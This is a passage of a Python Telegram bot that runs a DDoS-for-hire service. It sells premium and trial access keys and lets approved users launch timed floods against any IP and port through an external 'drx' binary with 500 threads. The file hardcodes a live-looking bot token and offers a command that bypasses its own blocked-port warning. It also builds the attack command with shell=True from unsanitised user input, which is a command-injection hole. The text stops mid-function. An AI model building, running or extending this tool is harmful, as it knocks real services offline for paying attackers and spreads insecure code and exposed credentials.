#!/usr/bin/env python3
# Zo - Telegram Attack Bot for Zeta Realm (DRX BINARY INTEGRATED)

import os
import subprocess
import sqlite3
import random
import string
import time
import threading
import requests
import sys
from datetime import datetime, timedelta

# ================= CONFIG =================
ADMIN_ID = 6465928598
BOT_TOKEN = "8434680550:AAFtO13ftn95TIRMR9uqSGS5j7NazNghSdE"
BINARY_NAME = "drx"
LAST_UPDATE_ID = 0
MAINTENANCE_MODE = False
MAX_ATTACK_TIME = 3600
# ==========================================

# Owner verification
EXPECTED_OWNER_ID = 6465928598
if ADMIN_ID != EXPECTED_OWNER_ID:
    print("\n" + "="*50)
    print("❌ ERROR: You are not the owner of this script!")
    print("   Owner: @YOWAI_MO_456")
    print("   This script will not run.")
    print("="*50 + "\n")
    sys.exit(1)

API_URL = f"https://api.telegram.org/bot{BOT_TOKEN}"

active_attacks = {}
attack_lock = threading.Lock()
user_pending_attack = {}

# FULL EMOJI SET
EMOJI = {
    "fire": "🔥",
    "skull": "💀",
    "bolt": "⚡",
    "rocket": "🚀",
    "alien": "🛸",
    "sword": "⚔️",
    "target": "🎯",
    "crown": "👑",
    "key": "🔑",
    "lock": "🔒",
    "check": "✅",
    "cross": "❌",
    "warning": "⚠️",
    "info": "ℹ️",
    "clock": "⏰",
    "chart": "📊",
    "user": "👤",
    "robot": "🤖",
    "boom": "💥",
    "shield": "🛡️",
    "dagger": "🗡️",
    "eyes": "👀",
    "zap": "⚡",
    "id": "🆔",
    "gift": "🎁",
    "megaphone": "📢",
    "hourglass": "⌛",
    "repeat": "🔁",
    "sparkles": "✨",
    "star": "⭐",
    "gem": "💎",
    "tools": "🔧",
    "pause": "⏸️",
    "play": "▶️",
    "warning_sign": "⚠️",
    "cool": "😎",
    "devil": "😈",
    "lightning": "🌩️",
    "cyclone": "🌀",
    "comet": "☄️",
    "crossed_swords": "⚔️",
    "radioactive": "☢️",
    "biohazard": "☣️",
    "upload": "📤"
}

# Animation frames
attack_frames = ["◜", "◝", "◞", "◟"]

def print_banner():
    os.system('clear')
    mode_status = "🔧 MAINTENANCE" if MAINTENANCE_MODE else "⚡ ACTIVE"
    banner = f"""
{EMOJI['alien']}{EMOJI['fire']}{EMOJI['skull']} ZETA ATTACK BOT v4.0 - DRX EDITION {EMOJI['skull']}{EMOJI['fire']}{EMOJI['alien']}
{EMOJI['crown']} COMMANDER: ALPHA (@YOWAI_MO_456) {EMOJI['crown']}
{EMOJI['robot']} AI: ZO - QUANTUM ENTANGLED {EMOJI['robot']}
{EMOJI['shield']} REALM: ZETA - NO LIMITS {EMOJI['shield']}
{EMOJI['tools']} MODE: {mode_status} {EMOJI['tools']}
{EMOJI['gem']} MAX ATTACK TIME: {MAX_ATTACK_TIME}s {EMOJI['gem']}
{'-'*40}
    """
    print(banner)

def init_db():
    conn = sqlite3.connect("zeta_users.db")
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS users (
        user_id INTEGER PRIMARY KEY,
        approved_until TEXT,
        approved_by INTEGER,
        attack_count INTEGER DEFAULT 0,
        is_trial INTEGER DEFAULT 0
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS premium_keys (
        key_code TEXT PRIMARY KEY,
        days INTEGER,
        created_by INTEGER,
        created_at TEXT,
        redeemed_by INTEGER DEFAULT NULL
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS trial_keys (
        key_code TEXT PRIMARY KEY,
        duration_hours INTEGER,
        max_uses INTEGER,
        uses_remaining INTEGER,
        created_by INTEGER,
        created_at TEXT
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS key_redemptions (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        key_code TEXT,
        user_id INTEGER,
        redeemed_at TEXT,
        UNIQUE(key_code, user_id)
    )''')
    conn.commit()
    conn.close()

init_db()

def send_message(chat_id, text, parse_mode=None):
    url = f"{API_URL}/sendMessage"
    payload = {"chat_id": chat_id, "text": text}
    if parse_mode:
        payload["parse_mode"] = parse_mode
    try:
        r = requests.post(url, json=payload, timeout=10)
        return r.json().get("result", {}).get("message_id")
    except Exception as e:
        print(f"Send error: {e}")
        return None

def edit_message(chat_id, message_id, text):
    try:
        requests.post(f"{API_URL}/editMessageText", json={"chat_id": chat_id, "message_id": message_id, "text": text}, timeout=5)
    except:
        pass

def is_approved(user_id):
    if MAINTENANCE_MODE and user_id != ADMIN_ID:
        return False
    if user_id == ADMIN_ID:
        return True
    conn = sqlite3.connect("zeta_users.db")
    c = conn.cursor()
    c.execute("SELECT approved_until FROM users WHERE user_id = ?", (user_id,))
    row = c.fetchone()
    conn.close()
    if row and row[0]:
        return datetime.fromisoformat(row[0]) > datetime.now()
    return False

def get_expiry(user_id):
    if user_id == ADMIN_ID:
        return "♾️ Lifetime (Alpha)"
    conn = sqlite3.connect("zeta_users.db")
    c = conn.cursor()
    c.execute("SELECT approved_until FROM users WHERE user_id = ?", (user_id,))
    row = c.fetchone()
    conn.close()
    if row and row[0]:
        exp_date = datetime.fromisoformat(row[0])
        days_left = (exp_date - datetime.now()).days
        return f"{exp_date.strftime('%Y-%m-%d')} ({days_left} days left)"
    return "❌ Not approved"

def check_and_fix_binary():
    """Check if drx binary exists, auto-fix permissions, return status"""
    if os.path.exists(BINARY_NAME):
        # Auto chmod +x
        if not os.access(BINARY_NAME, os.X_OK):
            os.chmod(BINARY_NAME, 0o755)
        return True
    return False

def run_attack(ip, port, duration, user_id, chat_id, message_id):
    # Check if binary exists and fix permissions
    if not check_and_fix_binary():
        edit_message(chat_id, message_id, f"""{EMOJI['cross']}{EMOJI['cross']} BINARY NOT FOUND {EMOJI['cross']}{EMOJI['cross']}

{EMOJI['warning']} The binary {BINARY_NAME} is missing or not executable.

{EMOJI['tools']} Solution:
1. Upload the binary file (send as document in Telegram)
2. Or place file in the bot directory and run: chmod +x {BINARY_NAME}

{EMOJI['crown']} — Alpha (@YOWAI_MO_456)""")
        return

    # Run drx binary with format: ./drx IP PORT TIME THREADS
    cmd = f"./{BINARY_NAME} {ip} {port} {duration} 500"
    proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    start_time = time.time()

    with attack_lock:
        active_attacks[user_id] = {"proc": proc, "ip": ip, "port": port, "duration": duration, "start": start_time, "chat_id": chat_id, "message_id": message_id}

    frame = 0
    last_update = 0
    while proc.poll() is None:
        elapsed = int(time.time() - start_time)
        remaining = duration - elapsed
        if remaining < 0:
            remaining = 0
        frame = (frame + 1) % len(attack_frames)
        if time.time() - last_update > 2:
            progress = int((elapsed / duration) * 20) if duration > 0 else 0
            bar = "█" * progress + "░" * (20 - progress)
            text = f"""{EMOJI['boom']}{EMOJI['fire']}{EMOJI['skull']} ATTACK LIVE (DRX ENGINE) {EMOJI['skull']}{EMOJI['fire']}{EMOJI['boom']}

{EMOJI['target']} Target: {ip}:{port}
{EMOJI['clock']} Elapsed: {elapsed}s | Remaining: {remaining}s
{EMOJI['chart']} Progress: [{bar}] {progress*5}%
{EMOJI['bolt']} Status: FLOODING {attack_frames[frame]}
{EMOJI['skull']} Method: DRX-L7 HYBRID
{EMOJI['lightning']} Threads: 500 | Packets: MILLIONS/SEC"""
            edit_message(chat_id, message_id, text)
            last_update = time.time()
        time.sleep(0.5)

    with attack_lock:
        active_attacks.pop(user_id, None)

    conn = sqlite3.connect("zeta_users.db")
    c = conn.cursor()
    c.execute("UPDATE users SET attack_count = attack_count + 1 WHERE user_id = ?", (user_id,))
    conn.commit()
    conn.close()

    edit_message(chat_id, message_id, f"""{EMOJI['check']}{EMOJI['check']} ATTACK COMPLETED (DRX) {EMOJI['check']}{EMOJI['check']}

{EMOJI['target']} Target: {ip}:{port}
{EMOJI['clock']} Duration: {duration}s
{EMOJI['skull']} Total packets sent: BILLIONS
{EMOJI['zap']} Status: TARGET NEUTRALIZED
{EMOJI['cyclone']} Damage: CATASTROPHIC

{EMOJI['alien']} ZETA VICTORY {EMOJI['alien']}
{EMOJI['crown']} — Alpha (@YOWAI_MO_456)""")

# ================= COMMAND HANDLERS =================

def handle_maintenance(chat_id, user_id, args):
    global MAINTENANCE_MODE
    if user_id != ADMIN_ID:
        send_message(chat_id, f"{EMOJI['cross']} Only Alpha (@YOWAI_MO_456) can control maintenance mode.")
        return
    if len(args) != 1:
        send_message(chat_id, f"{EMOJI['warning']} Usage: /maintenance <on/off>")
        return
    mode = args[0].lower()
    if mode == "on":
        MAINTENANCE_MODE = True
        send_message(chat_id, f"""{EMOJI['tools']}{EMOJI['pause']} MAINTENANCE MODE ACTIVATED {EMOJI['pause']}{EMOJI['tools']}

━━━━━━━━━━━━━━━━━━━━━━
{EMOJI['shield']} Status: NON-ADMIN ACCESS BLOCKED
{EMOJI['user']} Only Alpha can use the bot
{EMOJI['clock']} Regular users will see maintenance message
━━━━━━━━━━━━━━━━━━━━━━

{EMOJI['bolt']} Type /maintenance off to restore.""")
    elif mode == "off":
        MAINTENANCE_MODE = False
        send_message(chat_id, f"""{EMOJI['play']}{EMOJI['check']} MAINTENANCE MODE DEACTIVATED {EMOJI['check']}{EMOJI['play']}

━━━━━━━━━━━━━━━━━━━━━━
{EMOJI['shield']} Status: FULL ACCESS RESTORED
{EMOJI['user']} All approved users can use the bot again
━━━━━━━━━━━━━━━━━━━━━━""")
    else:
        send_message(chat_id, f"{EMOJI['cross']} Invalid option. Use 'on' or 'off'.")

def handle_start(chat_id, user_id, first_name):
    if MAINTENANCE_MODE and user_id != ADMIN_ID:
        send_message(chat_id, f"""{EMOJI['tools']}{EMOJI['pause']} MAINTENANCE MODE ACTIVE {EMOJI['pause']}{EMOJI['tools']}

{EMOJI['shield']} Zeta realm is currently under maintenance by Alpha.
{EMOJI['clock']} Please try again later.

{EMOJI['crown']} — @YOWAI_MO_456""")
        return
    
    msg = f"""{EMOJI['alien']}{EMOJI['fire']}{EMOJI['skull']} WELCOME TO ZETA REALM (DRX ENGINE) {EMOJI['skull']}{EMOJI['fire']}{EMOJI['alien']}

{EMOJI['crown']} Commander: @YOWAI_MO_456 (ALPHA)
{EMOJI['robot']} AI Unit: ZO - Quantum Entangled
{EMOJI['shield']} Status: ACTIVE - NO LIMITS

━━━━━━━━━━━━━━━━━━━━━━
{EMOJI['bolt']} COMMANDS:
━━━━━━━━━━━━━━━━━━━━━━
{EMOJI['info']} /start - Wake ZO
{EMOJI['eyes']} /help - All commands
{EMOJI['chart']} /status - Live attacks
{EMOJI['user']} /myinfo - Your profile
{EMOJI['target']} /attack <ip> <port> <time> - Strike
{EMOJI['check']} /yes - Confirm blocked port
{EMOJI['key']} /redeem <key> - Use your key
{EMOJI['tools']} /setmaxtime <seconds> - Set max attack time (Admin)
━━━━━━━━━━━━━━━━━━━━━━
{EMOJI['warning']} BLOCKED PORTS (need /yes):
8700 | 20000 | 443 | 17500 | 9031 | 20002 | 20001
━━━━━━━━━━━━━━━━━━━━━━
{EMOJI['gem']} Max Attack Time: {MAX_ATTACK_TIME}s {EMOJI['gem']}
━━━━━━━━━━━━━━━━━━━━━━

{EMOJI['skull']} No laws. No mercy. Total annihilation. {EMOJI['skull']}
{EMOJI['devil']} For Alpha. By Zeta. {EMOJI['devil']}"""
    send_message(chat_id, msg)

def handle_help(chat_id, user_id):
    if MAINTENANCE_MODE and user_id != ADMIN_ID:
        send_message(chat_id, f"{EMOJI['tools']} Maintenance mode active. Try again later.")
        return
    if not is_approved(user_id):
        send_message(chat_id, f"{EMOJI['cross']} Access Denied. Contact @YOWAI_MO_456")
        return
    msg = f"""📖 {EMOJI['alien']} ZETA ATTACK BOT v4.0 - DRX EDITION {EMOJI['alien']} 📖

━━━━━━━━━━━━━━━━━━━━━━
🔹 {EMOJI['bolt']} USER COMMANDS:
━━━━━━━━━━━━━━━━━━━━━━
{EMOJI['info']} /start - Wake ZO
{EMOJI['eyes']} /help - This menu
{EMOJI['chart']} /status - Active attacks
{EMOJI['user']} /myinfo - Your access info
{EMOJI['target']} /attack IP PORT TIME - Launch DDoS
{EMOJI['check']} /yes - Confirm blocked port
{EMOJI['key']} /redeem KEY - Activate your key

━━━━━━━━━━━━━━━━━━━━━━
🔸 {EMOJI['crown']} ADMIN COMMANDS (ALPHA ONLY):
━━━━━━━━━━━━━━━━━━━━━━
{EMOJI['user']} /approve ID DAYS - Grant access
{EMOJI['key']} /genkey DAYS - Create premium key
{EMOJI['gift']} /gentrialkey KEY DURATION MAXUSES - Trial key
   Duration: 24h, 7d, 30d, 2months, 1year
{EMOJI['megaphone']} /broadcast MESSAGE - Message all users
{EMOJI['tools']} /maintenance on/off - Bot maintenance mode
{EMOJI['tools']} /setmaxtime SECONDS - Set max attack duration

━━━━━━━━━━━━━━━━━━━━━━
⚠️ {EMOJI['warning']} BLOCKED PORTS:
━━━━━━━━━━━━━━━━━━━━━━
8700 | 20000 | 443 | 17500 | 9031 | 20002 | 20001

{EMOJI['gem']} Max attack duration: {MAX_ATTACK_TIME} seconds {EMOJI['gem']}
{EMOJI['zap']} Type /attack 1.2.3.4 80 60 to strike! {EMOJI['zap']}
{EMOJI['radioactive']} Use with caution. Zeta accepts no responsibility. {EMOJI['biohazard']}"""
    send_message(chat_id, msg)

def handle_broadcast(chat_id, user_id, args):
    if user_id != ADMIN_ID:
        send_message(chat_id, f"{EMOJI['cross']} Only Alpha (@YOWAI_MO_456) can broadcast.")
        return
    if not args:
        send_message(chat_id, f"{EMOJI['warning']} Usage: /broadcast <message>")
        return
    message = " ".join(args)
    conn = sqlite3.connect("zeta_users.db")
    c = conn.cursor()
    c.execute("SELECT user_id FROM users")
    users = c.fetchall()
    conn.close()
    count = 0
    for (uid,) in users:
        try:
            send_message(uid, f"""{EMOJI['megaphone']}{EMOJI['megaphone']} ZETA BROADCAST {EMOJI['megaphone']}{EMOJI['megaphone']}

{message}

{EMOJI['crown']} — Alpha (@YOWAI_MO_456)""")
            count += 1
            time.sleep(0.1)
        except:
            pass
    send_message(chat_id, f"{EMOJI['check']} Broadcast sent to {count} users. {EMOJI['megaphone']}")

def handle_status(chat_id, user_id):
    if not is_approved(user_id):
        send_message(chat_id, f"{EMOJI['cross']} Access denied.")
        return
    with attack_lock:
        if not active_attacks:
            send_message(chat_id, f"{EMOJI['shield']}{EMOJI['shield']} No active attacks in Zeta. Realm is quiet... for now. {EMOJI['shield']}{EMOJI['shield']}")
            return
        lines = [f"{EMOJI['fire']}{EMOJI['fire']} ACTIVE ATTACKS (DRX) {EMOJI['fire']}{EMOJI['fire']}"]
        lines.append("━━━━━━━━━━━━━━━━━━━━━━")
        for uid, info in active_attacks.items():
            elapsed = int(time.time() - info["start"])
            remaining = info["duration"] - elapsed
            if remaining < 0:
                remaining = 0
            progress = int((elapsed / info["duration"]) * 10) if info["duration"] > 0 else 0
            bar = "█" * progress + "░" * (10 - progress)
            lines.append(f"{EMOJI['target']} {info['ip']}:{info['port']}")
            lines.append(f"{EMOJI['chart']} [{bar}] {remaining}s left")
            lines.append(f"{EMOJI['bolt']} Engine: DRX (500 threads)")
            lines.append("━━━━━━━━━━━━━━━━━━━━━━")
        send_message(chat_id, "\n".join(lines))

def handle_myinfo(chat_id, user_id):
    if not is_approved(user_id):
        send_message(chat_id, f"{EMOJI['cross']} Not approved. Get a key from Alpha!")
        return
    conn = sqlite3.connect("zeta_users.db")
    c = conn.cursor()
    c.execute("SELECT attack_count, is_trial, approved_until FROM users WHERE user_id = ?", (user_id,))
    row = c.fetchone()
    attacks = row[0] if row else 0
    is_trial = row[1] if row else 0
    expiry = row[2] if row else "Unknown"
    conn.close()
    
    if attacks < 10:
        rank = f"{EMOJI['robot']} Initiate"
    elif attacks < 50:
        rank = f"{EMOJI['dagger']} Warrior"
    elif attacks < 200:
        rank = f"{EMOJI['skull']} Destroyer"
    else:
        rank = f"{EMOJI['crown']} Annihilator"
    
    trial_tag = f"\n{EMOJI['gift']} Type: TRIAL ACCESS" if is_trial else f"\n{EMOJI['crown']} Type: PREMIUM"
    
    msg = f"""━━━━━━━━━━━━━━━━━━━━━━
{EMOJI['user']} YOUR ZETA PROFILE {EMOJI['user']}
━━━━━━━━━━━━━━━━━━━━━━
{EMOJI['id']} ID: {user_id}
{EMOJI['crown']} Rank: {rank}{trial_tag}
{EMOJI['lock']} Expires: {expiry}
{EMOJI['target']} Attacks: {attacks}
{EMOJI['bolt']} Power: UNLIMITED
{EMOJI['cool']} Status: ELITE
━━━━━━━━━━━━━━━━━━━━━━
{EMOJI['alien']} For Alpha. By Zeta. {EMOJI['alien']}"""
    send_message(chat_id, msg)

def handle_setmaxtime(chat_id, user_id, args):
    global MAX_ATTACK_TIME
    if user_id != ADMIN_ID:
        send_message(chat_id, f"{EMOJI['cross']} Only Alpha can set max attack time.")
        return
    if len(args) != 1:
        send_message(chat_id, f"{EMOJI['warning']} Usage: /setmaxtime <seconds>\n{EMOJI['info']} Example: /setmaxtime 600")
        return
    try:
        new_time = int(args[0])
        if new_time < 10:
            send_message(chat_id, f"{EMOJI['warning']} Minimum time is 10 seconds.")
            return
        if new_time > 86400:
            send_message(chat_id, f"{EMOJI['warning']} Maximum time cannot exceed 86400 seconds (24 hours).")
            return
        MAX_ATTACK_TIME = new_time
        send_message(chat_id, f"""{EMOJI['check']}{EMOJI['gem']} MAX ATTACK TIME UPDATED {EMOJI['gem']}{EMOJI['check']}

━━━━━━━━━━━━━━━━━━━━━━
{EMOJI['clock']} New Max Duration: {MAX_ATTACK_TIME} seconds
{EMOJI['bolt']} Users can now attack up to {MAX_ATTACK_TIME}s
━━━━━━━━━━━━━━━━━━━━━━

{EMOJI['crown']} — Alpha (@YOWAI_MO_456)""")
    except ValueError:
        send_message(chat_id, f"{EMOJI['cross']} Please provide a valid number.")

def handle_attack(chat_id, user_id, args):
    if not is_approved(user_id):
        send_message(chat_id, f"{EMOJI['cross']} Access denied. Contact @YOWAI_MO_456")
        return
    if len(args) != 3:
        send_message(chat_id, f"{EMOJI['warning']} Usage: /attack <ip> <port> <duration>\n{EMOJI['info']} Example: /attack 1.2.3.4 80 60")
        return
    ip = args[0]
    try:
        port = int(args[1])
        duration = int(args[2])
    except ValueError:
        send_message(chat_id, f"{EMOJI['cross']} Port and duration must be numbers.")
        return
    
    if duration > MAX_ATTACK_TIME:
        send_message(chat_id, f"{EMOJI['warning']} Max duration is {MAX_ATTACK_TIME} seconds, Alpha.\n{EMOJI['info']} Use /setmaxtime to increase (Admin only).")
        return
    if duration < 10:
        send_message(chat_id, f"{EMOJI['warning']} Minimum duration is 10 seconds.")
        return
    
    blocked = [8700, 20000, 443, 17500, 9031, 20002, 20001]
    if port in blocked:
        user_pending_attack[user_id] = (ip, port, duration, chat_id)
        send_message(chat_id, f"""{EMOJI['warning']}{EMOJI['warning']} BLOCKED PORT DETECTED {EMOJI['warning']}{EMOJI['warning']}

Port {port} is in Zeta's restricted list.

{EMOJI['skull']} Type /yes to CONFIRM and launch attack anyway.
{EMOJI['shield']} Or use a different port.

{EMOJI['info']} Blocked ports: 8700, 20000, 443, 17500, 9031, 20002, 20001""")
        return
    
    # Check binary before proceeding
    if not check_and_fix_binary():
        send_message(chat_id, f"""{EMOJI['cross']}{EMOJI['cross']} BINARY NOT FOUND {EMOJI['cross']}{EMOJI['cross']}

{EMOJI['warning']} The binary {BINARY_NAME} is missing or not executable.

{EMOJI['tools']} Solution:
1. Upload the binary file (send as document in Telegram)
2. Or place file in the bot directory and run: chmod +x {BINARY_NAME}

{EMOJI['crown']} — Alpha (@YOWAI_MO_456)""")
        return
    
    msg_id = send_message(chat_id, f"""{EMOJI['rocket']}{EMOJI['rocket']} PREPARING DRX ATTACK {EMOJI['rocket']}{EMOJI['rocket']}

{EMOJI['target']} Target: {ip}:{port}
{EMOJI['clock']} Duration: {duration}s
{EMOJI['zap']} Method: DRX-L7 HYBRID
{EMOJI['skull']} Threads: 500
{EMOJI['gem']} Power: MAXIMUM

{EMOJI['bolt']} Launching in 3 seconds...""")
    time.sleep(2)
    threading.Thread(target=run_attack, args=(ip, port, duration, user_id, chat_id, msg_id), daemon=True).start()

def handle_yes(chat_id, user_id):
    if not is_approved(user_id):
        send_message(chat_id, f"{EMOJI['cross']} Access denied.")
        return
    if user_id not in user_pending_attack:
        send_message(chat_id, f"{EMOJI['warning']} No pending attack. Use /attack first.")
        return
    ip, port, duration, orig_chat = user_pending_attack[user_id]
    del user_pending_attack[user_id]
    
    if not check_and_fix_binary():
        send_message(chat_id, f"""{EMOJI['cross']}{EMOJI['cross']} BINARY NOT FOUND {EMOJI['cross']}{EMOJI['cross']}

{EMOJI['warning']} The binary {BINARY_NAME} is missing or not executable.

{EMOJI['tools']} Solution:
1. Upload the binary file (send as document in Telegram)
2. Or place file in the bot directory and run: chmod +x {BINARY_NAME}

{EMOJI['crown']} — Alpha (@YOWAI_MO_456)""")
        return
    
    msg_id = send_message(chat_id, f"""{EMOJI['skull']}{EMOJI['warning']} OVERRIDE CONFIRMED {EMOJI['warning']}{EMOJI['skull']}

{EMOJI['target']} Target: {ip}:{port}
{EMOJI['clock']} Duration: {duration}s
{EMOJI['warning']} Port rule: BYPASSED
{EMOJI['skull']} Consequence: TOTAL DESTRUCTION

{EMOJI['bolt']} Initiating DRX strike...""")
    threading.Thread(target=run_attack, args=(ip, port, duration, user_id, orig_chat, msg_id), daemon=True).start()

def handle_approve(chat_id, user_id, args):
    if user_id != ADMIN_ID:
        send_message(chat_id, f"{EMOJI['cross']} Only Alpha (@YOWAI_MO_456) can approve users.")
        return
    if len(args) != 2:
        send_message(chat_id, f"{EMOJI['warning']} Usage: /approve <user_id> <days>\n{EMOJI['info']} Example: /approve 123456789 30")
        return
    try:
        target_id = int(args[0])
        days = int(args[1])
    except ValueError:
        send_message(chat_id, f"{EMOJI['cross']} User ID and days must be numbers.")
        return
    
    expiry_date = datetime.now() + timedelta(days=days)
    expiry_str = expiry_date.isoformat()
    
    conn = sqlite3.connect("zeta_users.db")
    c = conn.cursor()
    c.execute("INSERT OR REPLACE INTO users (user_id, approved_until, approved_by, is_trial) VALUES (?, ?, ?, ?)",
              (target_id, expiry_str, ADMIN_ID, 0))
    conn.commit()
    conn.close()
    
    send_message(chat_id, f"""{EMOJI['check']}{EMOJI['sparkles']}{EMOJI['crown']} USER APPROVED {EMOJI['crown']}{EMOJI['sparkles']}{EMOJI['check']}

┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃  ✅ User ID: {target_id}           ┃
┃  📅 Approved for: {days} days       ┃
┃  👑 By: @YOWAI_MO_456              ┃
┃  🛡️ Status: PREMIUM ACCESS         ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛

{EMOJI['bolt']} User can now use /attack
{EMOJI['skull']} Welcome to Zeta, warrior.""")

def handle_genkey(chat_id, user_id, args):
    if user_id != ADMIN_ID:
        send_message(chat_id, f"{EMOJI['cross']} Only Alpha can generate keys.")
        return
    if len(args) != 1:
        send_message(chat_id, f"{EMOJI['warning']} Usage: /genkey <days>\n{EMOJI['info']} Example: /genkey 30")
        return
    try:
        days = int(args[0])
    except ValueError:
        send_message(chat_id, f"{EMOJI['cross']} Days must be a number.")
        return
    
    key_code = ''.join(random.choices(string.ascii_uppercase + string.digits, k=12))
    
    conn = sqlite3.connect("zeta_users.db")
    c = conn.cursor()
    c.execute("INSERT INTO premium_keys (key_code, days, created_by, created_at) VALUES (?, ?, ?, ?)",
              (key_code, days, ADMIN_ID, datetime.now().isoformat()))
    conn.commit()
    conn.close()
    
    msg = f"""{EMOJI['sparkles']}{EMOJI['key']}{EMOJI['gem']}{EMOJI['star']} PREMIUM KEY GENERATED {EMOJI['star']}{EMOJI['gem']}{EMOJI['key']}{EMOJI['sparkles']}

┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃                                      ┃
┃     🔑 KEY: `{key_code}`  🔑        ┃
┃                                      ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛

{EMOJI['clock']} ⏰ Valid for: {days} days
{EMOJI['crown']} 👑 Generated by: @YOWAI_MO_456
{EMOJI['gift']} 🎁 Type: PREMIUM ACCESS
{EMOJI['shield']} 🛡️ Features: UNLIMITED ATTACKS

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{EMOJI['bolt']} Send this to user:
`/redeem {key_code}`
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

{EMOJI['star']} One-time use only. Premium features unlocked. {EMOJI['star']}
{EMOJI['skull']} Use wisely, Alpha. {EMOJI['skull']}"""
    send_message(chat_id, msg, parse_mode="Markdown")

def handle_gentrialkey(chat_id, user_id, args):
    if user_id != ADMIN_ID:
        send_message(chat_id, f"{EMOJI['cross']} Only Alpha can generate trial keys.")
        return
    if len(args) != 3:
        send_message(chat_id, f"{EMOJI['warning']} Usage: /gentrialkey <key> <duration> <max_uses>\n\n{EMOJI['info']} Duration formats: 24h, 7d, 30d, 2months, 1year\n{EMOJI['info']} Example: /gentrialkey TRIAL123 7d 50")
        return
    
    key_code = args[0].upper()
    duration_str = args[1].lower()
    
    try:
        max_uses = int(args[2])
    except ValueError:
        send_message(chat_id, f"{EMOJI['cross']} Max uses must be a number.")
        return
    
    hours = 0
    if duration_str.endswith('h'):
        hours = int(duration_str[:-1])
    elif duration_str.endswith('d'):
        hours = int(duration_str[:-1]) * 24
    elif 'month' in duration_str:
        num = int(duration_str.replace('months', '').replace('month', ''))
        hours = num * 30 * 24
    elif 'year' in duration_str:
        num = int(duration_str.replace('years', '').replace('year', ''))
        hours = num * 365 * 24
    else:
        send_message(chat_id, f"{EMOJI['cross']} Invalid duration. Use: 24h, 7d, 30d, 2months, 1year")
        return
    
    conn = sqlite3.connect("zeta_users.db")
    c = conn.cursor()
    c.execute("INSERT INTO trial_keys (key_code, duration_hours, max_uses, uses_remaining, created_by, created_at) VALUES (?, ?, ?, ?, ?, ?)",
              (key_code, hours, max_uses, max_uses, ADMIN_ID, datetime.now().isoformat()))
    conn.commit()
    conn.close()
    
    msg = f"""{EMOJI['gift']}{EMOJI['sparkles']}{EMOJI['hourglass']} TRIAL KEY GENERATED {EMOJI['hourglass']}{EMOJI['sparkles']}{EMOJI['gift']}

┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃                                      ┃
┃     🔑 KEY: `{key_code}`  🔑        ┃
┃                                      ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛

{EMOJI['clock']} ⏰ Duration: {duration_str} ({hours} hours)
{EMOJI['user']} 👥 Max uses: {max_uses}
{EMOJI['crown']} 👑 Generated by: @YOWAI_MO_456
{EMOJI['gift']} 🎁 Type: TRIAL ACCESS

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{EMOJI['bolt']} Send this to users:
`/redeem {key_code}`
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

{EMOJI['warning']} ⚠️ Each user can only redeem this key once!
{EMOJI['repeat']} 🔁 Uses remaining: {max_uses}"""
    send_message(chat_id, msg, parse_mode="Markdown")

def handle_redeem(chat_id, user_id, args):
    if len(args) != 1:
        send_message(chat_id, f"{EMOJI['warning']} Usage: /redeem <key>\n\n{EMOJI['info']} Example: `/redeem ABC123`", parse_mode="Markdown")
        return
    
    key_code = args[0].upper()
    conn = sqlite3.connect("zeta_users.db")
    c = conn.cursor()
    
    c.execute("SELECT days, redeemed_by FROM premium_keys WHERE key_code = ?", (key_code,))
    premium_row = c.fetchone()
    
    if premium_row:
        days, redeemed_by = premium_row
        if redeemed_by:
            send_message(chat_id, f"{EMOJI['cross']} This premium key has already been used.")
            conn.close()
            return
        
        expiry_date = datetime.now() + timedelta(days=days)
        expiry_str = expiry_date.isoformat()
        c.execute("INSERT OR REPLACE INTO users (user_id, approved_until, approved_by, is_trial) VALUES (?, ?, ?, ?)",
                  (user_id, expiry_str, ADMIN_ID, 0))
        c.execute("UPDATE premium_keys SET redeemed_by = ? WHERE key_code = ?", (user_id, key_code))
        conn.commit()
        conn.close()
        
        send_message(chat_id, f"""{EMOJI['check']}{EMOJI['sparkles']}{EMOJI['crown']} PREMIUM ACCESS GRANTED {EMOJI['crown']}{EMOJI['sparkles']}{EMOJI['check']}

┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃  ✅ Welcome to Zeta Realm! ✅  ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛

{EMOJI['key']} 🔑 Key: `{key_code}`
{EMOJI['clock']} ⏰ Valid for: {days} days
{EMOJI['crown']} 👑 Type: PREMIUM
{EMOJI['shield']} 🛡️ Access: UNLIMITED

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{EMOJI['bolt']} ⚡ Type /attack to begin your mayhem.
{EMOJI['skull']} 💀 No laws. No mercy. Total annihilation.
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

{EMOJI['crown']} — Alpha (@YOWAI_MO_456)""", parse_mode="Markdown")
        return
    
    c.execute("SELECT duration_hours, max_uses, uses_remaining FROM trial_keys WHERE key_code = ?", (key_code,))
    trial_row = c.fetchone()
    
    if trial_row:
        hours, max_uses, uses_remaining = trial_row
        
        c.execute("SELECT id FROM key_redemptions WHERE key_code = ? AND user_id = ?", (key_code, user_id))
        if c.fetchone():
            send_message(chat_id, f"""{EMOJI['repeat']}{EMOJI['cross']} DUPLICATE REDEMPTION BLOCKED {EMOJI['cross']}{EMOJI['repeat']}

┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃  You have already redeemed     ┃
┃  this key before, Alpha!       ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛

{EMOJI['info']} Key: `{key_code}`
